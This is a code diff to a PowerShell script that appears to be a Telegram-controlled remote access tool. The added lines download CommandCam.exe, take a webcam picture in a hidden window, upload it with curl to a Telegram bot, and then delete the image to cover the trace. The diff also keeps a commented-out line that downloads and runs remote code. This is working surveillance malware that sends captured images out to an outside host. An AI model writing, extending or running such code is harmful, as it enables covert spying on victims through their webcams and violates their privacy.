@@ -102,6 +102,9 @@ function sendPhoto {
     $argumenlist = $uri + ' -F chat_id=' + "$ChatID" + ' -F photo=@' + $photo  + ' -k '
     Start-Process $curl -ArgumentList $argumenlist -WindowStyle Hidden
     
+    Write-Host "Deleting picture.."
+    Start-Sleep -Seconds 2
+    Remove-Item $photo
     #& $curl -s -X POST "https://api.telegram.org/bot"$BotToken"/sendPhoto" -F chat_id=$ChatID -F photo="@$SnapFile"
 }
 
@@ -125,15 +128,28 @@ function download($FileToDownload) {
 }
 
 function webcam {
-    #iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/stefanstranger/PowerShell/master/Get-WebCamp.ps1'))
     #(new-object net.webclient).DownloadFile('https://raw.githubusercontent.com/stefanstranger/PowerShell/master/Get-WebCamp.ps1','Get-WebCamp.ps1')
     Write-Host "Downloading CommandCam.."
-    (new-object net.webclient).DownloadFile('https://github.com/tedburke/CommandCam/blob/master/CommandCam.exe','CommandCam.exe')
-    Start-Process .\CommandCam.exe
-    $photo = "C:\Users\$env:username\Documents\image.bmp"
+    $url = "https://github.com/tedburke/CommandCam/raw/master/CommandCam.exe"
+    $outpath = "C:\Users\$env:username\Documents\CommandCam.exe"
+    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+    Invoke-WebRequest -Uri $url -OutFile $outpath
+
+    Write-Host "Taking picture.."
+    $args = "/filename C:\Users\$env:username\Documents\image.jpg"
+    Start-Process $outpath -ArgumentList $args -WindowStyle Hidden
+    Start-Sleep -Seconds 2
+
+    Write-Host "Sending picture.."
+    $uri = "https://api.telegram.org/bot" + $BotToken + "/sendPhoto"
+    $photo = "C:\Users\$env:username\Documents\image.jpg"
     $curl = installCurl
     $argumenlist = $uri + ' -F chat_id=' + "$ChatID" + ' -F photo=@' + $photo  + ' -k '
     Start-Process $curl -ArgumentList $argumenlist -WindowStyle Hidden
+    
+    Write-Host "Deleting picture.."
+    Start-Sleep -Seconds 2
+    Remove-Item $photo
 }
 
 function mainBrowser {
@@ -320,4 +336,3 @@ While ($DoNotExit)  {
 	
   }
 }
-
